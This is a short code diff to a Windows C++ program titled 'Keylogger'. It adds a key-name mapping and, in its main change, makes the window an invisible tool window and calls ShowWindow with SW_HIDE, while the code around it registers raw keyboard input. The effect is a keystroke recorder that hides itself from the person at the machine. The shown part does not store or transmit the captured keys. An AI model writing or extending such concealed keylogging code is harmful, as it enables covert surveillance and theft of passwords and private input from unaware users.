@@ -68,7 +68,8 @@ std::unordered_map<DWORD, std::wstring> vkeyToWString = {
     {0x84, L"F21"}, {0x85, L"F22"}, {0x86, L"F23"}, {0x87, L"F24"},
     {0x90, L"Num Lock"}, {0x91, L"Scroll Lock"},
     {0xA0, L"Left Shift"}, {0xA1, L"Right Shift"}, {0xA2, L"Left Ctrl"},
-    {0xA3, L"Right Ctrl"}, {0xA4, L"Left Alt"}, {0xA5, L"Right Alt"}
+    {0xA3, L"Right Ctrl"}, {0xA4, L"Left Alt"}, {0xA5, L"Right Alt"},
+    {0xC0, L"~"}
 };
 
 void LogMessage(const std::wstring& message) {
@@ -150,7 +151,7 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine
     // create window
     LogMessage(L"Creating window");
     HWND hwnd = CreateWindowEx(
-        0, CLASS_NAME, L"Keylogger", WS_OVERLAPPEDWINDOW,
+        WS_EX_TOOLWINDOW, CLASS_NAME, L"Keylogger", WS_POPUP,
         CW_USEDEFAULT, CW_USEDEFAULT, 300, 200,
         NULL, NULL, hInstance, NULL
     );
@@ -158,7 +159,7 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine
         MessageBox(NULL, L"Window creation failed!", L"Error", MB_OK);
         return 1;
     }
-    ShowWindow(hwnd, nCmdShow);
+    ShowWindow(hwnd, SW_HIDE);
     // register raw input from keyboards
     LogMessage(L"Registering raw input");
     RAWINPUTDEVICE rid[1];
